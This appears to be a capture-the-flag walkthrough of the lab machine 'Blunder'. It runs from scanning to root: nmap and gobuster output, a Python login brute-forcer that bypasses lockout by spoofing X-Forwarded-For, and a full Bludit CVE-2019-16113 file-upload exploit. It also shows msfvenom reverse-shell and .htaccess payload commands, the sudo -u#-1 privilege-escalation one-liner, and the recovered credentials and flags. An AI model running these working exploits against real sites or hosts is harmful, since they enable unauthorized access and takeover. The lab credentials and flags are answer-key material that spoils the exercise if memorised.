## nmap

### initial

```bash
# Nmap 7.80 scan initiated Mon Aug 31 05:44:47 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 31 05:45:08 2020 -- 1 IP address (1 host up) scanned in 21.00 seconds
```

### full port scan

```bash
# Nmap 7.80 scan initiated Mon Aug 31 09:37:29 2020 as: nmap -p- -oN nmap/fullscan 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.27s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE
21/tcp closed ftp
80/tcp open   http

# Nmap done at Mon Aug 31 09:54:17 2020 -- 1 IP address (1 host up) scanned in 1008.56 seconds
```

## gobuster

### first
```bash
/opt/gobuster/build/gobuster-linux-amd64/gobuster dir -u "http://10.10.10.191/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

/admin/
```

### second (for extensions)
```bash
/opt/gobuster/build/gobuster-linux-amd64/gobuster dir -x txt,php -u "http://10.10.10.191/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

todo.txt
```

## content of todo.txt
```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

### dictionary
```bash
cewl http://10.10.10.191/ > site.txt
```

### wrote poc.py

```python
#!/usr/bin/env python3
import re
import requests
import urllib.parse

host = 'http://10.10.10.191'
login_url = host + '/admin/'
username = 'fergus' #admin

def get_res(filename):
	return [item.replace("\n", "") for item in open(filename).readlines()]

wordlist = get_res('site.txt')
x = 0

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
    x +=1
    print('[*] {x}: {p}'.format(x = x, p = password))

    headers = {
        'X-Forwarded-For': urllib.parse.quote(password),
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
    print(login_result.text)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

#### creds of http://10.10.10.191/admin/login:	fergus:RolandDeschain

### access.py

```python
# Title: Bludit 3.9.2 - Directory Traversal
# Author: James Green
# Date: 2020-07-20
# Vendor Homepage: https://www.bludit.com
# Software Link: https://github.com/bludit/bludit
# Version: 3.9.2
# Tested on: Linux Ubuntu 19.10 Eoan
# CVE: CVE-2019-16113
# 
# Special Thanks to Ali Faraj (@InfoSecAli) and authors of MSF Module https://www.exploit-db.com/exploits/47699

#### USAGE ####
# 1. Create payloads: .png with PHP payload and the .htaccess to treat .pngs like PHP
# 2. Change hardcoded values: URL is your target webapp, username and password is admin creds to get to the admin dir
# 3. Run the exploit
# 4. Start a listener to match your payload: `nc -nlvp 53`, meterpreter multi handler, etc
# 5. Visit your target web app and open the evil picture: visit url + /bl-content/tmp/temp/evil.png

#!/usr/bin/env python3

import requests
import re
import argparse
import random
import string
import base64
from requests.exceptions import Timeout

url = 'http://10.10.10.191'  # CHANGE ME
username = 'fergus'  # CHANGE ME
password = 'RolandDeschain'  # CHANGE ME

# msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=53 -f raw -b '"' > evil.png
# echo -e "<?php $(cat evil.png)" > evil.png 
payload = 'php_rev.php.png'  # CREATE ME

# echo "RewriteEngine off" > .htaccess
# echo "AddType application/x-httpd-php .png" >> .htaccess
payload2 = '.htaccess'  # CREATE ME

def login(url,username,password):
    """ Log in with provided admin creds, grab the cookie once authenticated """
    session = requests.Session()
    login_page = session.get(url + "/admin/")
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"',
                           login_page.text
                 ).group(1)
    cookie = ((login_page.headers["Set-Cookie"]).split(";")[0].split("=")[1])
    data = {"save":"",
            "password":password,
            "tokenCSRF":csrf_token,
            "username":username}
    headers = {"Origin":url,
               "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Upgrade-Insecure-Requests":"1",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Connection":"close",
               "Referer": url + "/admin/",
               "Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding":"gzip, deflate",
               "Content-Type":"application/x-www-form-urlencoded"
    }
    cookies = {"BLUDIT-KEY":cookie}
    response = session.post(url + "/admin/",
                            data=data,
                            headers=headers,
                            cookies=cookies,
                            allow_redirects = False
               )

    print("cookie: " + cookie)
    return cookie

def get_csrf_token(url,cookie):
    """ Grab the CSRF token from an authed session """

    session = requests.Session()
    headers = {"Origin":url,
               "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Upgrade-Insecure-Requests":"1",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Connection":"close",
               "Referer":url + "/admin/",
               "Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding":"gzip, deflate"}
    cookies = {"BLUDIT-KEY":cookie}
    response = session.get(url + "/admin/dashboard",
                           headers=headers,
                           cookies=cookies
               )
    csrf_token = response.text.split('var tokenCSRF = "')[1].split('"')[0]

    print("csrf_token: " + csrf_token)
    return csrf_token

def upload_evil_image(url, cookie, csrf_token, payload, override_uuid=False):
    """ Upload files required for to execute PHP from malicious image files. Payload and .htaccess """

    session = requests.Session()
    files= {"images[]": (payload,
                         open(payload, "rb"),
                         "multipart/form-data",
                         {"Content-Type": "image/png", "filename":payload}
                        )}
    if override_uuid:
        data = {"uuid": "../../tmp/temp",
                "tokenCSRF":csrf_token}
    else:
        # On the vuln app, this line occurs first:
        # Filesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);
        # Even though there is a file extension check, it won't really stop us
        # from uploading the .htaccess file.
        data = {"tokenCSRF":csrf_token}
    headers = {"Origin":url,
               "Accept":"*/*",
               "X-Requested-With":"XMLHttpRequest",
               "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
               "Connection":"close",
               "Referer":url + "/admin/new-content",
               "Accept-Language":"es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
               "Accept-Encoding":"gzip, deflate",
    }
    cookies = {"BLUDIT-KEY":cookie}
    response = session.post(url + "/admin/ajax/upload-images", data=data, files=files, headers=headers, cookies=cookies)
    print("Uploading payload: " + payload)

if __name__ == "__main__":
  cookie = login(url, username, password)
  cookie = login(url, username, password)
  token = get_csrf_token(url, cookie)
  upload_evil_image(url, cookie, token, payload, True)
  upload_evil_image(url, cookie, token, payload2)
```

### php reverse shell in /usr/share/reverse_shells/php_rev.php


### file users.php found in /var/www/bludit-3.10.0a/bl-content/databases has faca404fd5c0a31cf1897b823c695c85cffeb98d (sha1) of hugo user:  
```
hugo:Password120
```

### user.txt: 78344bb61557cd048e3bdfd26fd58062

### output of sudo -l:
```
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

And sudo version is ```1.8.25p1```

### exploit: ``` sudo -u#-1 /bin/bash ```

### root.txt: 016c7465265ebbeb55c2d7f6a257b4e4



